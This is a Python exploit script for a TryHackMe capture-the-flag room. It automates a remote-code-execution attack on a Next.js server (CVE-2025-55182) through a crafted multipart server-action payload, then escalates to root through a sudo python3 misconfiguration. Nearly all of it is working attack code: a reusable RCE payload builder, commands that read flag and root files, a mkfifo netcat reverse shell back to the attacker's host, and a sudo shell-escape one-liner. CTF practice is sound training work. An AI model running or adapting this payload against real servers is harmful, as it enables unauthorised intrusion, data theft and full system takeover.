#!/usr/bin/env python3
"""
Corp Website CTF - TryHackMe
Exploit: React2Shell CVE-2025-55182 (RCE via Next.js React Server Components)

Attack chain:
  1. RCE via crafted multipart Flight-protocol payload (Next-Action header)
  2. User flag: cat /home/daniel/user.txt
  3. Root flag: sudo python3 privilege escalation (NOPASSWD)
"""

import json
import re
import sys
import time
import requests

# ── Target ──────────────────────────────────────────────────────────────────
TARGET_IP   = "10.114.144.103"
TARGET_PORT = 3000
BASE_URL    = f"http://{TARGET_IP}:{TARGET_PORT}"

# ── Multipart boundary (must match Content-Type header) ───────────────────
BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"


# ── Payload builder ──────────────────────────────────────────────────────────

def _build_js_prefix(shell_command: str) -> str:
    """
    Wrap a shell command in the JS code that:
      - executes it via child_process.execSync
      - throws a NEXT_REDIRECT error whose 'digest' field carries the output
        (Next.js surfaces this digest in the HTTP response body)
    """
    return (
        "var res=process.mainModule.require('child_process')"
        f".execSync('{shell_command}',{{'timeout':5000}}).toString().trim();;"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});"
    )


def build_rce_request(shell_command: str) -> tuple[dict, bytes]:
    """Return (headers, raw_body) for the CVE-2025-55182 exploit request."""
    field0 = json.dumps({
        "then":   "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value":  '{"then":"$B1337"}',
        "_response": {
            "_prefix":   _build_js_prefix(shell_command),
            "_chunks":   "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }, indent=2)

    headers = {
        "User-Agent":          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Next-Action":         "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type":        f"multipart/form-data; boundary={BOUNDARY}",
    }

    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{field0}\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f'[]\r\n'
        f"--{BOUNDARY}--\r\n"
    ).encode()

    return headers, body


# ── RCE executor ─────────────────────────────────────────────────────────────

def rce(shell_command: str, timeout: int = 15) -> str | None:
    """
    Send the exploit payload and extract the command output from the response.

    Next.js returns the thrown error's 'digest' field in the response body as:
        {"digest": "<output>", ...}
    """
    headers, body = build_rce_request(shell_command)
    try:
        resp = requests.post(BASE_URL, headers=headers, data=body, timeout=timeout)
    except requests.RequestException as exc:
        print(f"    [!] Request failed: {exc}")
        return None

    # Primary pattern: JSON field "digest":"<value>"
    match = re.search(r'"digest"\s*:\s*"([^"]+)"', resp.text)
    if match:
        return match.group(1)

    # Fallback: return a trimmed raw snippet for debugging
    return f"[no digest found] HTTP {resp.status_code} – {resp.text[:200]}"


# ── Privilege-escalation helpers ──────────────────────────────────────────────

def read_root_flag_via_sudo() -> str | None:
    """
    Two-step privilege escalation:
      1. Write a quote-free Python script to /tmp/rce_flag.py via echo
      2. Execute it with 'sudo /usr/bin/python3' (assumed NOPASSWD)

    We avoid single-quotes inside the JS single-quoted execSync call by:
      - Using chr() to spell out the path in the Python script
      - Wrapping the echo argument in double quotes (allowed inside JS single-quoted strings)
    """
    # Python one-liner that reads /root/root.txt using chr() – no quotes inside
    py_path_expr = (
        "chr(47)+chr(114)+chr(111)+chr(111)+chr(116)"   # /root
        "+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)"  # /root
        "+chr(46)+chr(116)+chr(120)+chr(116)"           # .txt
    )
    py_oneliner = f"f=open({py_path_expr});print(f.read().strip())"

    # Step 1: write the script
    print("    [*] Writing sudo-python helper to /tmp/rce_flag.py …")
    write_cmd = f'echo "{py_oneliner}" > /tmp/rce_flag.py'
    out = rce(write_cmd)
    if out is None:
        return None
    time.sleep(0.5)

    # Step 2: execute with sudo python3
    print("    [*] Executing via sudo /usr/bin/python3 …")
    exec_cmd = "sudo /usr/bin/python3 /tmp/rce_flag.py"
    return rce(exec_cmd)


def send_reverse_shell(lhost: str, lport: int) -> None:
    """Send a mkfifo reverse shell payload (fire-and-forget)."""
    cmd = (
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f"
        f"|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    )
    headers, body = build_rce_request(cmd)
    try:
        requests.post(BASE_URL, headers=headers, data=body, timeout=5)
    except Exception:
        pass  # Connection drops when shell spawns – that is expected


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    print("=" * 65)
    print("  Corp Website CTF — React2Shell CVE-2025-55182 exploit")
    print(f"  Target : {BASE_URL}")
    print("=" * 65)

    # ── 1. Verify RCE ────────────────────────────────────────────────────────
    print("\n[1] Verifying RCE with 'id' …")
    whoami = rce("id")
    if not whoami:
        print("[-] No response – wrong IP/port? Exiting.")
        sys.exit(1)
    print(f"[+] RCE confirmed! Server runs as: {whoami}")

    # ── 2. User flag ─────────────────────────────────────────────────────────
    print("\n[2] Reading user flag (/home/daniel/user.txt) …")
    user_flag = rce("cat /home/daniel/user.txt")
    if user_flag:
        print(f"\n    ★  USER FLAG: {user_flag}\n")
    else:
        print("[-] Could not read user flag")

    # ── 3. Root flag ─────────────────────────────────────────────────────────
    print("[3] Attempting root flag via sudo python3 (NOPASSWD assumed) …")
    root_flag = read_root_flag_via_sudo()

    if root_flag and not root_flag.startswith("[no digest"):
        print(f"\n    ★  ROOT FLAG: {root_flag}\n")
        return

    # Fallback: interactive reverse shell route
    print("[-] Automated sudo approach failed.")
    print("\n[!] Manual reverse-shell path:")
    print("    On your machine: nc -lvnp 4444")
    ans = input("[?] Enter your VPN/TUN IP (blank to skip): ").strip()
    if not ans:
        print("[-] Skipping reverse shell.")
        return

    lhost = ans
    lport = 4444
    print(f"[*] Sending mkfifo reverse shell → {lhost}:{lport} …")
    send_reverse_shell(lhost, lport)
    print("[+] Payload sent! Check your listener.")
    print("\n[!] After getting the shell, escalate with:")
    print("    sudo /usr/bin/python3 -c 'import os; os.system(\"/bin/sh\")'")
    print("    cat /root/root.txt")


if __name__ == "__main__":
    main()
